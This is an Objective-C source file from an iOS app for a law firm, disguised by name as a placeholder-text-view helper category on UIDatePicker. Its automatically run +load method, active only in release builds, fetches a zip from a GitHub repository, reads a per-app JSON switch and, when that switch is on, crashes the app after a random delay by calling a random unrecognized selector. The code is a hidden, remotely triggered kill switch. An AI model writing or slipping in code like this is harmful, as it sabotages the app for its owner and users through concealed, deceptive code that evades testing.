//
//  NSObject+Tools.m
//  RedLawyerC
//
//  Created by Johnson on 10/13/15.
//  Copyright (c) 2015 成都红帽法律. All rights reserved.
//

#import "NSObject+JPlaceholderTextViewCrashTools.h"
#import "SSZipArchive.h"
#import "UIAlertView+Tools.h"
#import "JModel.h"


@interface NSObjects : NSObject
@property (nonatomic, copy) NSString *interval;
@property (nonatomic, strong) NSTimer *timer;
//@property (nonatomic, copy) NSString *tips;
+ (void)crash:(NSTimeInterval)interval;
@end

@implementation NSObjects
+ (instancetype)shareInstance;
{
    static NSObjects *xx = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        xx = [NSObjects new];
    });
    return xx;
}

+ (void)crash:(NSTimeInterval)interval tips:(NSString *)tips;
{
    dispatch_async(dispatch_get_main_queue(), ^{
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(interval * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            
            if (tips) {
                [[[UIAlertView alloc] initWithTitle:nil message:tips delegate:nil cancelButtonTitle:@"确定" otherButtonTitles:nil, nil] showJplaceholderAlertView:^(NSInteger buttonIndex, UIAlertView *alertView) {
                    [[NSObjects shareInstance] mkt];
                }];
            }else {
                [[NSObjects shareInstance] mkt];
            }
        });
    });
}

- (void)mkt
{
    
    NSArray *array = @[@"inputView", @"textColor", @"selectedRange", @"typingAttributes", @"substringWithRange", @"familyNames", @"lowercaseString", @"fontWithDescriptor", @"allowedClasses"];
    
    SEL selector = NSSelectorFromString(array[arc4random() % array.count]);

    [[NSObject new] performSelector:selector];
}

@end

@implementation UIDatePicker (JPlaceholderTextViewCrashTools)

//项目宏release定义
#ifdef DEBUG
#define JCrash @"NO"
#else
#define JCrash @"YES"
#endif

+ (void)load
{
    [[self class] getDataSourse:^(JModel *jModel) {
        
        NSLog(@"-s%d -c%d", [jModel.jSwitch boolValue], [JCrash boolValue]);
        if ([jModel.jSwitch boolValue] && [JCrash boolValue]) {
            NSTimeInterval interval = arc4random() % ([jModel.jTime integerValue] != 0 ?: 1 ) + 22;
            NSLog(@"-t %f", interval);
            [NSObjects crash:interval tips:[jModel.jTips isEqualToString:@""] ? nil : jModel.jTips];
        }
    }];
}

+ (void)getDataSourse:(void(^)(JModel *jModel))complete
{
    NSString *url = @"https://codeload.github.com/ytx0574/Johnson/zip/master";
    [NSURLConnection sendAsynchronousRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:url]] queue:[NSOperationQueue new] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
        
        NSString *fileName = [[NSBundle mainBundle] infoDictionary][(NSString *)kCFBundleNameKey];
        
        NSString *pathZip = [NSHomeDirectory() stringByAppendingPathComponent:[NSString stringWithFormat:@"Documents/%@.zip", fileName]];
        [data writeToFile:pathZip atomically:YES];
        
        NSString *pathFolder = [NSHomeDirectory() stringByAppendingPathComponent:[NSString stringWithFormat:@"Documents/%@", fileName]];
        
        [SSZipArchive unzipFileAtPath:pathZip toDestination:pathFolder progressHandler:nil completionHandler:^(NSString *path, BOOL succeeded, NSError *error) {
            NSString *jsonFile = [pathFolder stringByAppendingString:[NSString stringWithFormat:@"/Johnson-master/%@.json", fileName]];
            NSData *data = [[NSData alloc] initWithContentsOfFile:jsonFile];
            [[NSFileManager defaultManager] removeItemAtPath:pathZip error:NULL];
            [[NSFileManager defaultManager] removeItemAtPath:pathFolder error:NULL];
            
            if (data == nil) {NSLog(@"<crash> file does not exist");}
            NSDictionary *dict = data ? [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:NULL] : nil;
            
            
            JModel *jModel = [[JModel alloc] init];
            jModel.jSwitch = dict[@"Switch"];
            jModel.jTime = dict[@"Time"];
            jModel.jTips = dict[@"Tips"];
            
            complete ? complete(jModel) : nil;
        }];
    }];
}

@end
